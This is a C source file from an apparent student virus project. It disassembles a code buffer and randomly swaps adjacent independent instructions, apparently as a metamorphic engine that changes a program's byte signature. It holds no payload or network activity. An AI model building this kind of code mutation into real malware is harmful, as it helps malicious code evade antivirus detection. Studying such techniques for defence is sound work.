/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   permutation.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/13 09:30:34 by anselme           #+#    #+#             */
/*   Updated: 2019/12/20 02:49:15 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdbool.h>
#include <stddef.h>

#include "compiler_utils.h"
#include "disasm.h"
#include "utils.h"

#ifdef DEBUG
# include "errors.h"
# include "syscall.h"
#endif

static bool	want_to_permutate(uint64_t *seed)
{
	return random(seed) % 2;
}

static bool	can_permutate(const struct s_instruction *a, const struct s_instruction *b)
{
	// TODO: UNKNOWN & NONE exception
	bool	same_dest      = !!(a->dst & b->dst);
	bool	a_dst_is_b_src = !!(a->dst & b->src);
	bool	b_dst_is_a_src = !!(b->dst & a->src);

	if (same_dest || a_dst_is_b_src || b_dst_is_a_src)
		return false;
	return true;
}

static void	permutate_neighbors(struct s_instruction *a, struct s_instruction *b)
{
	// small addresses first
	if (a->addr > b->addr)
	{
		permutate_neighbors(b, a);
		return;
	}

#ifdef DEBUG
	// check if actually neighbours!
	if (a->addr + a->length != b->addr)
	{
		sys_exit(errors(ERR_VIRUS, _ERR_IMPOSSIBLE));
	}
#endif

	// backup 1st
	uint8_t	swap_code[INSTRUCTION_MAXLEN];
	memcpy(swap_code, a->addr, a->length);

	// copy b in a
	memcpy(a->addr, b->addr, b->length);

	// copy a after that
	void	*after_b = a->addr + b->length;
	memcpy(after_b, swap_code, a->length);

	// reassign addresses
	b->addr = a->addr;
	a->addr = after_b;

	// swap instructions array position
	struct s_instruction swap;
	swap = *a;
	*a = *b;
	*b = swap;
}

static void	maybe_permutate(struct s_instruction *a, struct s_instruction *b, uint64_t *seed)
{
	if (want_to_permutate(seed) && can_permutate(a, b))
	{
		permutate_neighbors(a, b);
	}
}

/*
** This function never fails : worst case senario, it does nothing
*/
bool		permutate_instructions(void *buffer, uint64_t seed, size_t size)
{
	struct s_instruction	inst[1024];

	size_t n_inst = disasm(buffer, size, inst, ARRAY_SIZE(inst));

	// if failed to disassemble any instruction
	if (n_inst == 0) return true;

	// randomly permutate instructions
	for (size_t i = 0; i < n_inst * 4; i++)
	{
		uint64_t	rand = random_inrange(&seed, 0, n_inst - 2);
		maybe_permutate(&inst[rand], &inst[rand + 1], &seed);
	}

	return true;
}
